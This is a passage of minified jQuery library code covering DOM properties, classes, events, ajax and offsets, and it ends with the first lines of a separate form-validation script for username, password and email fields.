            return r || (i = mt[a], mt[a] = o, o = null != n(e, t, r) ? a : null, mt[a] = i), o
        }
    });
    var gt = /^(?:input|select|textarea|button)$/i,
        vt = /^(?:a|area)$/i;

    function yt(e) {
        return (e.match(P) || []).join(" ")
    }

    function xt(e) {
        return e.getAttribute && e.getAttribute("class") || ""
    }

    function bt(e) {
        return Array.isArray(e) ? e : "string" == typeof e && e.match(P) || []
    }
    w.fn.extend({
        prop: function(e, t) {
            return _(this, w.prop, e, t, 1 < arguments.length)
        },
        removeProp: function(e) {
            return this.each(function() {
                delete this[w.propFix[e] || e]
            })
        }
    }), w.extend({
        prop: function(e, t, n) {
            var r, o, i = e.nodeType;
            if (3 !== i && 8 !== i && 2 !== i) return 1 === i && w.isXMLDoc(e) || (t = w.propFix[t] || t, o = w.propHooks[t]), void 0 !== n ? o && "set" in o && void 0 !== (r = o.set(e, n, t)) ? r : e[t] = n : o && "get" in o && null !== (r = o.get(e, t)) ? r : e[t]
        },
        propHooks: {
            tabIndex: {
                get: function(e) {
                    var t = w.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : gt.test(e.nodeName) || vt.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        },
        propFix: {
            for: "htmlFor",
            class: "className"
        }
    }), h.optSelected || (w.propHooks.selected = {
        get: function(e) {
            var t = e.parentNode;
            return t && t.parentNode && t.parentNode.selectedIndex, null
        },
        set: function(e) {
            var t = e.parentNode;
            t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex)
        }
    }), w.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        w.propFix[this.toLowerCase()] = this
    }), w.fn.extend({
        addClass: function(e) {
            var t, n, r, o, i, a, s, u = 0;
            if (m(e)) return this.each(function(t) {
                w(this).addClass(e.call(this, t, xt(this)))
            });
            if ((t = bt(e)).length)
                for (; n = this[u++];)
                    if (o = xt(n), r = 1 === n.nodeType && " " + yt(o) + " ") {
                        for (a = 0; i = t[a++];) r.indexOf(" " + i + " ") < 0 && (r += i + " ");
                        o !== (s = yt(r)) && n.setAttribute("class", s)
                    } return this
        },
        removeClass: function(e) {
            var t, n, r, o, i, a, s, u = 0;
            if (m(e)) return this.each(function(t) {
                w(this).removeClass(e.call(this, t, xt(this)))
            });
            if (!arguments.length) return this.attr("class", "");
            if ((t = bt(e)).length)
                for (; n = this[u++];)
                    if (o = xt(n), r = 1 === n.nodeType && " " + yt(o) + " ") {
                        for (a = 0; i = t[a++];)
                            for (; - 1 < r.indexOf(" " + i + " ");) r = r.replace(" " + i + " ", " ");
                        o !== (s = yt(r)) && n.setAttribute("class", s)
                    } return this
        },
        toggleClass: function(e, t) {
            var n = typeof e,
                r = "string" === n || Array.isArray(e);
            return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : m(e) ? this.each(function(n) {
                w(this).toggleClass(e.call(this, n, xt(this), t), t)
            }) : this.each(function() {
                var t, o, i, a;
                if (r)
                    for (o = 0, i = w(this), a = bt(e); t = a[o++];) i.hasClass(t) ? i.removeClass(t) : i.addClass(t);
                else void 0 !== e && "boolean" !== n || ((t = xt(this)) && Q.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : Q.get(this, "__className__") || ""))
            })
        },
        hasClass: function(e) {
            var t, n, r = 0;
            for (t = " " + e + " "; n = this[r++];)
                if (1 === n.nodeType && -1 < (" " + yt(xt(n)) + " ").indexOf(t)) return !0;
            return !1
        }
    });
    var wt = /\r/g;
    w.fn.extend({
        val: function(e) {
            var t, n, r, o = this[0];
            return arguments.length ? (r = m(e), this.each(function(n) {
                var o;
                1 === this.nodeType && (null == (o = r ? e.call(this, n, w(this).val()) : e) ? o = "" : "number" == typeof o ? o += "" : Array.isArray(o) && (o = w.map(o, function(e) {
                    return null == e ? "" : e + ""
                })), (t = w.valHooks[this.type] || w.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, o, "value") || (this.value = o))
            })) : o ? (t = w.valHooks[o.type] || w.valHooks[o.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(o, "value")) ? n : "string" == typeof(n = o.value) ? n.replace(wt, "") : null == n ? "" : n : void 0
        }
    }), w.extend({
        valHooks: {
            option: {
                get: function(e) {
                    var t = w.find.attr(e, "value");
                    return null != t ? t : yt(w.text(e))
                }
            },
            select: {
                get: function(e) {
                    var t, n, r, o = e.options,
                        i = e.selectedIndex,
                        a = "select-one" === e.type,
                        s = a ? null : [],
                        u = a ? i + 1 : o.length;
                    for (r = i < 0 ? u : a ? i : 0; r < u; r++)
                        if (((n = o[r]).selected || r === i) && !n.disabled && (!n.parentNode.disabled || !A(n.parentNode, "optgroup"))) {
                            if (t = w(n).val(), a) return t;
                            s.push(t)
                        } return s
                },
                set: function(e, t) {
                    for (var n, r, o = e.options, i = w.makeArray(t), a = o.length; a--;)((r = o[a]).selected = -1 < w.inArray(w.valHooks.option.get(r), i)) && (n = !0);
                    return n || (e.selectedIndex = -1), i
                }
            }
        }
    }), w.each(["radio", "checkbox"], function() {
        w.valHooks[this] = {
            set: function(e, t) {
                if (Array.isArray(t)) return e.checked = -1 < w.inArray(w(e).val(), t)
            }
        }, h.checkOn || (w.valHooks[this].get = function(e) {
            return null === e.getAttribute("value") ? "on" : e.value
        })
    }), h.focusin = "onfocusin" in e;
    var Et = /^(?:focusinfocus|focusoutblur)$/,
        Tt = function(e) {
            e.stopPropagation()
        };
    w.extend(w.event, {
        trigger: function(t, n, o, i) {
            var a, s, u, l, c, f, p, h, v = [o || r],
                y = d.call(t, "type") ? t.type : t,
                x = d.call(t, "namespace") ? t.namespace.split(".") : [];
            if (s = h = u = o = o || r, 3 !== o.nodeType && 8 !== o.nodeType && !Et.test(y + w.event.triggered) && (-1 < y.indexOf(".") && (y = (x = y.split(".")).shift(), x.sort()), c = y.indexOf(":") < 0 && "on" + y, (t = t[w.expando] ? t : new w.Event(y, "object" == typeof t && t)).isTrigger = i ? 2 : 3, t.namespace = x.join("."), t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + x.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = o), n = null == n ? [t] : w.makeArray(n, [t]), p = w.event.special[y] || {}, i || !p.trigger || !1 !== p.trigger.apply(o, n))) {
                if (!i && !p.noBubble && !g(o)) {
                    for (l = p.delegateType || y, Et.test(l + y) || (s = s.parentNode); s; s = s.parentNode) v.push(s), u = s;
                    u === (o.ownerDocument || r) && v.push(u.defaultView || u.parentWindow || e)
                }
                for (a = 0;
                    (s = v[a++]) && !t.isPropagationStopped();) h = s, t.type = 1 < a ? l : p.bindType || y, (f = (Q.get(s, "events") || {})[t.type] && Q.get(s, "handle")) && f.apply(s, n), (f = c && s[c]) && f.apply && Y(s) && (t.result = f.apply(s, n), !1 === t.result && t.preventDefault());
                return t.type = y, i || t.isDefaultPrevented() || p._default && !1 !== p._default.apply(v.pop(), n) || !Y(o) || c && m(o[y]) && !g(o) && ((u = o[c]) && (o[c] = null), w.event.triggered = y, t.isPropagationStopped() && h.addEventListener(y, Tt), o[y](), t.isPropagationStopped() && h.removeEventListener(y, Tt), w.event.triggered = void 0, u && (o[c] = u)), t.result
            }
        },
        simulate: function(e, t, n) {
            var r = w.extend(new w.Event, n, {
                type: e,
                isSimulated: !0
            });
            w.event.trigger(r, null, t)
        }
    }), w.fn.extend({
        trigger: function(e, t) {
            return this.each(function() {
                w.event.trigger(e, t, this)
            })
        },
        triggerHandler: function(e, t) {
            var n = this[0];
            if (n) return w.event.trigger(e, t, n, !0)
        }
    }), h.focusin || w.each({
        focus: "focusin",
        blur: "focusout"
    }, function(e, t) {
        var n = function(e) {
            w.event.simulate(t, e.target, w.event.fix(e))
        };
        w.event.special[t] = {
            setup: function() {
                var r = this.ownerDocument || this,
                    o = Q.access(r, t);
                o || r.addEventListener(e, n, !0), Q.access(r, t, (o || 0) + 1)
            },
            teardown: function() {
                var r = this.ownerDocument || this,
                    o = Q.access(r, t) - 1;
                o ? Q.access(r, t, o) : (r.removeEventListener(e, n, !0), Q.remove(r, t))
            }
        }
    });
    var Ct = e.location,
        kt = Date.now(),
        Nt = /\?/;
    w.parseXML = function(t) {
        var n;
        if (!t || "string" != typeof t) return null;
        try {
            n = (new e.DOMParser).parseFromString(t, "text/xml")
        } catch (t) {
            n = void 0
        }
        return n && !n.getElementsByTagName("parsererror").length || w.error("Invalid XML: " + t), n
    };
    var St = /\[\]$/,
        At = /\r?\n/g,
        Dt = /^(?:submit|button|image|reset|file)$/i,
        jt = /^(?:input|select|textarea|keygen)/i;

    function It(e, t, n, r) {
        var o;
        if (Array.isArray(t)) w.each(t, function(t, o) {
            n || St.test(e) ? r(e, o) : It(e + "[" + ("object" == typeof o && null != o ? t : "") + "]", o, n, r)
        });
        else if (n || "object" !== x(t)) r(e, t);
        else
            for (o in t) It(e + "[" + o + "]", t[o], n, r)
    }
    w.param = function(e, t) {
        var n, r = [],
            o = function(e, t) {
                var n = m(t) ? t() : t;
                r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n)
            };
        if (null == e) return "";
        if (Array.isArray(e) || e.jquery && !w.isPlainObject(e)) w.each(e, function() {
            o(this.name, this.value)
        });
        else
            for (n in e) It(n, e[n], t, o);
        return r.join("&")
    }, w.fn.extend({
        serialize: function() {
            return w.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var e = w.prop(this, "elements");
                return e ? w.makeArray(e) : this
            }).filter(function() {
                var e = this.type;
                return this.name && !w(this).is(":disabled") && jt.test(this.nodeName) && !Dt.test(e) && (this.checked || !fe.test(e))
            }).map(function(e, t) {
                var n = w(this).val();
                return null == n ? null : Array.isArray(n) ? w.map(n, function(e) {
                    return {
                        name: t.name,
                        value: e.replace(At, "\r\n")
                    }
                }) : {
                    name: t.name,
                    value: n.replace(At, "\r\n")
                }
            }).get()
        }
    });
    var Lt = /%20/g,
        Bt = /#.*$/,
        qt = /([?&])_=[^&]*/,
        Ht = /^(.*?):[ \t]*([^\r\n]*)$/gm,
        Pt = /^(?:GET|HEAD)$/,
        Ot = /^\/\//,
        Rt = {},
        Mt = {},
        Ft = "*/".concat("*"),
        Wt = r.createElement("a");

    function $t(e) {
        return function(t, n) {
            "string" != typeof t && (n = t, t = "*");
            var r, o = 0,
                i = t.toLowerCase().match(P) || [];
            if (m(n))
                for (; r = i[o++];) "+" === r[0] ? (r = r.slice(1) || "*", (e[r] = e[r] || []).unshift(n)) : (e[r] = e[r] || []).push(n)
        }
    }

    function _t(e, t, n, r) {
        var o = {},
            i = e === Mt;

        function a(s) {
            var u;
            return o[s] = !0, w.each(e[s] || [], function(e, s) {
                var l = s(t, n, r);
                return "string" != typeof l || i || o[l] ? i ? !(u = l) : void 0 : (t.dataTypes.unshift(l), a(l), !1)
            }), u
        }
        return a(t.dataTypes[0]) || !o["*"] && a("*")
    }

    function Ut(e, t) {
        var n, r, o = w.ajaxSettings.flatOptions || {};
        for (n in t) void 0 !== t[n] && ((o[n] ? e : r || (r = {}))[n] = t[n]);
        return r && w.extend(!0, e, r), e
    }
    Wt.href = Ct.href, w.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: Ct.href,
            type: "GET",
            isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Ct.protocol),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": Ft,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /\bxml\b/,
                html: /\bhtml/,
                json: /\bjson\b/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": JSON.parse,
                "text xml": w.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(e, t) {
            return t ? Ut(Ut(e, w.ajaxSettings), t) : Ut(w.ajaxSettings, e)
        },
        ajaxPrefilter: $t(Rt),
        ajaxTransport: $t(Mt),
        ajax: function(t, n) {
            "object" == typeof t && (n = t, t = void 0), n = n || {};
            var o, i, a, s, u, l, c, d, f, p, h = w.ajaxSetup({}, n),
                m = h.context || h,
                g = h.context && (m.nodeType || m.jquery) ? w(m) : w.event,
                v = w.Deferred(),
                y = w.Callbacks("once memory"),
                x = h.statusCode || {},
                b = {},
                E = {},
                T = "canceled",
                C = {
                    readyState: 0,
                    getResponseHeader: function(e) {
                        var t;
                        if (c) {
                            if (!s)
                                for (s = {}; t = Ht.exec(a);) s[t[1].toLowerCase() + " "] = (s[t[1].toLowerCase() + " "] || []).concat(t[2]);
                            t = s[e.toLowerCase() + " "]
                        }
                        return null == t ? null : t.join(", ")
                    },
                    getAllResponseHeaders: function() {
                        return c ? a : null
                    },
                    setRequestHeader: function(e, t) {
                        return null == c && (e = E[e.toLowerCase()] = E[e.toLowerCase()] || e, b[e] = t), this
                    },
                    overrideMimeType: function(e) {
                        return null == c && (h.mimeType = e), this
                    },
                    statusCode: function(e) {
                        var t;
                        if (e)
                            if (c) C.always(e[C.status]);
                            else
                                for (t in e) x[t] = [x[t], e[t]];
                        return this
                    },
                    abort: function(e) {
                        var t = e || T;
                        return o && o.abort(t), k(0, t), this
                    }
                };
            if (v.promise(C), h.url = ((t || h.url || Ct.href) + "").replace(Ot, Ct.protocol + "//"), h.type = n.method || n.type || h.method || h.type, h.dataTypes = (h.dataType || "*").toLowerCase().match(P) || [""], null == h.crossDomain) {
                l = r.createElement("a");
                try {
                    l.href = h.url, l.href = l.href, h.crossDomain = Wt.protocol + "//" + Wt.host != l.protocol + "//" + l.host
                } catch (t) {
                    h.crossDomain = !0
                }
            }
            if (h.data && h.processData && "string" != typeof h.data && (h.data = w.param(h.data, h.traditional)), _t(Rt, h, n, C), c) return C;
            for (f in (d = w.event && h.global) && 0 == w.active++ && w.event.trigger("ajaxStart"), h.type = h.type.toUpperCase(), h.hasContent = !Pt.test(h.type), i = h.url.replace(Bt, ""), h.hasContent ? h.data && h.processData && 0 === (h.contentType || "").indexOf("application/x-www-form-urlencoded") && (h.data = h.data.replace(Lt, "+")) : (p = h.url.slice(i.length), h.data && (h.processData || "string" == typeof h.data) && (i += (Nt.test(i) ? "&" : "?") + h.data, delete h.data), !1 === h.cache && (i = i.replace(qt, "$1"), p = (Nt.test(i) ? "&" : "?") + "_=" + kt++ + p), h.url = i + p), h.ifModified && (w.lastModified[i] && C.setRequestHeader("If-Modified-Since", w.lastModified[i]), w.etag[i] && C.setRequestHeader("If-None-Match", w.etag[i])), (h.data && h.hasContent && !1 !== h.contentType || n.contentType) && C.setRequestHeader("Content-Type", h.contentType), C.setRequestHeader("Accept", h.dataTypes[0] && h.accepts[h.dataTypes[0]] ? h.accepts[h.dataTypes[0]] + ("*" !== h.dataTypes[0] ? ", " + Ft + "; q=0.01" : "") : h.accepts["*"]), h.headers) C.setRequestHeader(f, h.headers[f]);
            if (h.beforeSend && (!1 === h.beforeSend.call(m, C, h) || c)) return C.abort();
            if (T = "abort", y.add(h.complete), C.done(h.success), C.fail(h.error), o = _t(Mt, h, n, C)) {
                if (C.readyState = 1, d && g.trigger("ajaxSend", [C, h]), c) return C;
                h.async && 0 < h.timeout && (u = e.setTimeout(function() {
                    C.abort("timeout")
                }, h.timeout));
                try {
                    c = !1, o.send(b, k)
                } catch (t) {
                    if (c) throw t;
                    k(-1, t)
                }
            } else k(-1, "No Transport");

            function k(t, n, r, s) {
                var l, f, p, b, E, T = n;
                c || (c = !0, u && e.clearTimeout(u), o = void 0, a = s || "", C.readyState = 0 < t ? 4 : 0, l = 200 <= t && t < 300 || 304 === t, r && (b = function(e, t, n) {
                    for (var r, o, i, a, s = e.contents, u = e.dataTypes;
                        "*" === u[0];) u.shift(), void 0 === r && (r = e.mimeType || t.getResponseHeader("Content-Type"));
                    if (r)
                        for (o in s)
                            if (s[o] && s[o].test(r)) {
                                u.unshift(o);
                                break
                            } if (u[0] in n) i = u[0];
                    else {
                        for (o in n) {
                            if (!u[0] || e.converters[o + " " + u[0]]) {
                                i = o;
                                break
                            }
                            a || (a = o)
                        }
                        i = i || a
                    }
                    if (i) return i !== u[0] && u.unshift(i), n[i]
                }(h, C, r)), b = function(e, t, n, r) {
                    var o, i, a, s, u, l = {},
                        c = e.dataTypes.slice();
                    if (c[1])
                        for (a in e.converters) l[a.toLowerCase()] = e.converters[a];
                    for (i = c.shift(); i;)
                        if (e.responseFields[i] && (n[e.responseFields[i]] = t), !u && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), u = i, i = c.shift())
                            if ("*" === i) i = u;
                            else if ("*" !== u && u !== i) {
                        if (!(a = l[u + " " + i] || l["* " + i]))
                            for (o in l)
                                if ((s = o.split(" "))[1] === i && (a = l[u + " " + s[0]] || l["* " + s[0]])) {
                                    !0 === a ? a = l[o] : !0 !== l[o] && (i = s[0], c.unshift(s[1]));
                                    break
                                } if (!0 !== a)
                            if (a && e.throws) t = a(t);
                            else try {
                                t = a(t)
                            } catch (e) {
                                return {
                                    state: "parsererror",
                                    error: a ? e : "No conversion from " + u + " to " + i
                                }
                            }
                    }
                    return {
                        state: "success",
                        data: t
                    }
                }(h, b, C, l), l ? (h.ifModified && ((E = C.getResponseHeader("Last-Modified")) && (w.lastModified[i] = E), (E = C.getResponseHeader("etag")) && (w.etag[i] = E)), 204 === t || "HEAD" === h.type ? T = "nocontent" : 304 === t ? T = "notmodified" : (T = b.state, f = b.data, l = !(p = b.error))) : (p = T, !t && T || (T = "error", t < 0 && (t = 0))), C.status = t, C.statusText = (n || T) + "", l ? v.resolveWith(m, [f, T, C]) : v.rejectWith(m, [C, T, p]), C.statusCode(x), x = void 0, d && g.trigger(l ? "ajaxSuccess" : "ajaxError", [C, h, l ? f : p]), y.fireWith(m, [C, T]), d && (g.trigger("ajaxComplete", [C, h]), --w.active || w.event.trigger("ajaxStop")))
            }
            return C
        },
        getJSON: function(e, t, n) {
            return w.get(e, t, n, "json")
        },
        getScript: function(e, t) {
            return w.get(e, void 0, t, "script")
        }
    }), w.each(["get", "post"], function(e, t) {
        w[t] = function(e, n, r, o) {
            return m(n) && (o = o || r, r = n, n = void 0), w.ajax(w.extend({
                url: e,
                type: t,
                dataType: o,
                data: n,
                success: r
            }, w.isPlainObject(e) && e))
        }
    }), w._evalUrl = function(e, t) {
        return w.ajax({
            url: e,
            type: "GET",
            dataType: "script",
            cache: !0,
            async: !1,
            global: !1,
            converters: {
                "text script": function() {}
            },
            dataFilter: function(e) {
                w.globalEval(e, t)
            }
        })
    }, w.fn.extend({
        wrapAll: function(e) {
            var t;
            return this[0] && (m(e) && (e = e.call(this[0])), t = w(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function() {
                for (var e = this; e.firstElementChild;) e = e.firstElementChild;
                return e
            }).append(this)), this
        },
        wrapInner: function(e) {
            return m(e) ? this.each(function(t) {
                w(this).wrapInner(e.call(this, t))
            }) : this.each(function() {
                var t = w(this),
                    n = t.contents();
                n.length ? n.wrapAll(e) : t.append(e)
            })
        },
        wrap: function(e) {
            var t = m(e);
            return this.each(function(n) {
                w(this).wrapAll(t ? e.call(this, n) : e)
            })
        },
        unwrap: function(e) {
            return this.parent(e).not("body").each(function() {
                w(this).replaceWith(this.childNodes)
            }), this
        }
    }), w.expr.pseudos.hidden = function(e) {
        return !w.expr.pseudos.visible(e)
    }, w.expr.pseudos.visible = function(e) {
        return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length)
    }, w.ajaxSettings.xhr = function() {
        try {
            return new e.XMLHttpRequest
        } catch (e) {}
    };
    var zt = {
            0: 200,
            1223: 204
        },
        Xt = w.ajaxSettings.xhr();
    h.cors = !!Xt && "withCredentials" in Xt, h.ajax = Xt = !!Xt, w.ajaxTransport(function(t) {
        var n, r;
        if (h.cors || Xt && !t.crossDomain) return {
            send: function(o, i) {
                var a, s = t.xhr();
                if (s.open(t.type, t.url, t.async, t.username, t.password), t.xhrFields)
                    for (a in t.xhrFields) s[a] = t.xhrFields[a];
                for (a in t.mimeType && s.overrideMimeType && s.overrideMimeType(t.mimeType), t.crossDomain || o["X-Requested-With"] || (o["X-Requested-With"] = "XMLHttpRequest"), o) s.setRequestHeader(a, o[a]);
                n = function(e) {
                    return function() {
                        n && (n = r = s.onload = s.onerror = s.onabort = s.ontimeout = s.onreadystatechange = null, "abort" === e ? s.abort() : "error" === e ? "number" != typeof s.status ? i(0, "error") : i(s.status, s.statusText) : i(zt[s.status] || s.status, s.statusText, "text" !== (s.responseType || "text") || "string" != typeof s.responseText ? {
                            binary: s.response
                        } : {
                            text: s.responseText
                        }, s.getAllResponseHeaders()))
                    }
                }, s.onload = n(), r = s.onerror = s.ontimeout = n("error"), void 0 !== s.onabort ? s.onabort = r : s.onreadystatechange = function() {
                    4 === s.readyState && e.setTimeout(function() {
                        n && r()
                    })
                }, n = n("abort");
                try {
                    s.send(t.hasContent && t.data || null)
                } catch (o) {
                    if (n) throw o
                }
            },
            abort: function() {
                n && n()
            }
        }
    }), w.ajaxPrefilter(function(e) {
        e.crossDomain && (e.contents.script = !1)
    }), w.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /\b(?:java|ecma)script\b/
        },
        converters: {
            "text script": function(e) {
                return w.globalEval(e), e
            }
        }
    }), w.ajaxPrefilter("script", function(e) {
        void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET")
    }), w.ajaxTransport("script", function(e) {
        var t, n;
        if (e.crossDomain || e.scriptAttrs) return {
            send: function(o, i) {
                t = w("<script>").attr(e.scriptAttrs || {}).prop({
                    charset: e.scriptCharset,
                    src: e.url
                }).on("load error", n = function(e) {
                    t.remove(), n = null, e && i("error" === e.type ? 404 : 200, e.type)
                }), r.head.appendChild(t[0])
            },
            abort: function() {
                n && n()
            }
        }
    });
    var Vt, Yt = [],
        Gt = /(=)\?(?=&|$)|\?\?/;
    w.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var e = Yt.pop() || w.expando + "_" + kt++;
            return this[e] = !0, e
        }
    }), w.ajaxPrefilter("json jsonp", function(t, n, r) {
        var o, i, a, s = !1 !== t.jsonp && (Gt.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && Gt.test(t.data) && "data");
        if (s || "jsonp" === t.dataTypes[0]) return o = t.jsonpCallback = m(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, s ? t[s] = t[s].replace(Gt, "$1" + o) : !1 !== t.jsonp && (t.url += (Nt.test(t.url) ? "&" : "?") + t.jsonp + "=" + o), t.converters["script json"] = function() {
            return a || w.error(o + " was not called"), a[0]
        }, t.dataTypes[0] = "json", i = e[o], e[o] = function() {
            a = arguments
        }, r.always(function() {
            void 0 === i ? w(e).removeProp(o) : e[o] = i, t[o] && (t.jsonpCallback = n.jsonpCallback, Yt.push(o)), a && m(i) && i(a[0]), a = i = void 0
        }), "script"
    }), h.createHTMLDocument = ((Vt = r.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Vt.childNodes.length), w.parseHTML = function(e, t, n) {
        return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (h.createHTMLDocument ? ((o = (t = r.implementation.createHTMLDocument("")).createElement("base")).href = r.location.href, t.head.appendChild(o)) : t = r), a = !n && [], (i = D.exec(e)) ? [t.createElement(i[1])] : (i = we([e], t, a), a && a.length && w(a).remove(), w.merge([], i.childNodes)));
        var o, i, a
    }, w.fn.load = function(e, t, n) {
        var r, o, i, a = this,
            s = e.indexOf(" ");
        return -1 < s && (r = yt(e.slice(s)), e = e.slice(0, s)), m(t) ? (n = t, t = void 0) : t && "object" == typeof t && (o = "POST"), 0 < a.length && w.ajax({
            url: e,
            type: o || "GET",
            dataType: "html",
            data: t
        }).done(function(e) {
            i = arguments, a.html(r ? w("<div>").append(w.parseHTML(e)).find(r) : e)
        }).always(n && function(e, t) {
            a.each(function() {
                n.apply(this, i || [e.responseText, t, e])
            })
        }), this
    }, w.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
        w.fn[t] = function(e) {
            return this.on(t, e)
        }
    }), w.expr.pseudos.animated = function(e) {
        return w.grep(w.timers, function(t) {
            return e === t.elem
        }).length
    }, w.offset = {
        setOffset: function(e, t, n) {
            var r, o, i, a, s, u, l = w.css(e, "position"),
                c = w(e),
                d = {};
            "static" === l && (e.style.position = "relative"), s = c.offset(), i = w.css(e, "top"), u = w.css(e, "left"), ("absolute" === l || "fixed" === l) && -1 < (i + u).indexOf("auto") ? (a = (r = c.position()).top, o = r.left) : (a = parseFloat(i) || 0, o = parseFloat(u) || 0), m(t) && (t = t.call(e, n, w.extend({}, s))), null != t.top && (d.top = t.top - s.top + a), null != t.left && (d.left = t.left - s.left + o), "using" in t ? t.using.call(e, d) : c.css(d)
        }
    }, w.fn.extend({
        offset: function(e) {
            if (arguments.length) return void 0 === e ? this : this.each(function(t) {
                w.offset.setOffset(this, e, t)
            });
            var t, n, r = this[0];
            return r ? r.getClientRects().length ? (t = r.getBoundingClientRect(), n = r.ownerDocument.defaultView, {
                top: t.top + n.pageYOffset,
                left: t.left + n.pageXOffset
            }) : {
                top: 0,
                left: 0
            } : void 0
        },
        position: function() {
            if (this[0]) {
                var e, t, n, r = this[0],
                    o = {
                        top: 0,
                        left: 0
                    };
                if ("fixed" === w.css(r, "position")) t = r.getBoundingClientRect();
                else {
                    for (t = this.offset(), n = r.ownerDocument, e = r.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === w.css(e, "position");) e = e.parentNode;
                    e && e !== r && 1 === e.nodeType && ((o = w(e).offset()).top += w.css(e, "borderTopWidth", !0), o.left += w.css(e, "borderLeftWidth", !0))
                }
                return {
                    top: t.top - o.top - w.css(r, "marginTop", !0),
                    left: t.left - o.left - w.css(r, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                for (var e = this.offsetParent; e && "static" === w.css(e, "position");) e = e.offsetParent;
                return e || oe
            })
        }
    }), w.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(e, t) {
        var n = "pageYOffset" === t;
        w.fn[e] = function(r) {
            return _(this, function(e, r, o) {
                var i;
                if (g(e) ? i = e : 9 === e.nodeType && (i = e.defaultView), void 0 === o) return i ? i[t] : e[r];
                i ? i.scrollTo(n ? i.pageXOffset : o, n ? o : i.pageYOffset) : e[r] = o
            }, e, r, arguments.length)
        }
    }), w.each(["top", "left"], function(e, t) {
        w.cssHooks[t] = Ue(h.pixelPosition, function(e, n) {
            if (n) return n = _e(e, t), Fe.test(n) ? w(e).position()[t] + "px" : n
        })
    }), w.each({
        Height: "height",
        Width: "width"
    }, function(e, t) {
        w.each({
            padding: "inner" + e,
            content: t,
            "": "outer" + e
        }, function(n, r) {
            w.fn[r] = function(o, i) {
                var a = arguments.length && (n || "boolean" != typeof o),
                    s = n || (!0 === o || !0 === i ? "margin" : "border");
                return _(this, function(t, n, o) {
                    var i;
                    return g(t) ? 0 === r.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (i = t.documentElement, Math.max(t.body["scroll" + e], i["scroll" + e], t.body["offset" + e], i["offset" + e], i["client" + e])) : void 0 === o ? w.css(t, n, s) : w.style(t, n, o, s)
                }, t, a ? o : void 0, a)
            }
        })
    }), w.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function(e, t) {
        w.fn[t] = function(e, n) {
            return 0 < arguments.length ? this.on(t, null, e, n) : this.trigger(t)
        }
    }), w.fn.extend({
        hover: function(e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        }
    }), w.fn.extend({
        bind: function(e, t, n) {
            return this.on(e, null, t, n)
        },
        unbind: function(e, t) {
            return this.off(e, null, t)
        },
        delegate: function(e, t, n, r) {
            return this.on(t, e, n, r)
        },
        undelegate: function(e, t, n) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
        }
    }), w.proxy = function(e, t) {
        var n, r, o;
        if ("string" == typeof t && (n = e[t], t = e, e = n), m(e)) return r = i.call(arguments, 2), (o = function() {
            return e.apply(t || this, r.concat(i.call(arguments)))
        }).guid = e.guid = e.guid || w.guid++, o
    }, w.holdReady = function(e) {
        e ? w.readyWait++ : w.ready(!0)
    }, w.isArray = Array.isArray, w.parseJSON = JSON.parse, w.nodeName = A, w.isFunction = m, w.isWindow = g, w.camelCase = V, w.type = x, w.now = Date.now, w.isNumeric = function(e) {
        var t = w.type(e);
        return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e))
    }, "function" == typeof define && define.amd && define("jquery", [], function() {
        return w
    });
    var Qt = e.jQuery,
        Jt = e.$;
    return w.noConflict = function(t) {
        return e.$ === w && (e.$ = Jt), t && e.jQuery === w && (e.jQuery = Qt), w
    }, t || (e.jQuery = e.$ = w), w
});
var error_username = !1,
    error_password = !1;

function validateEmail(e) {
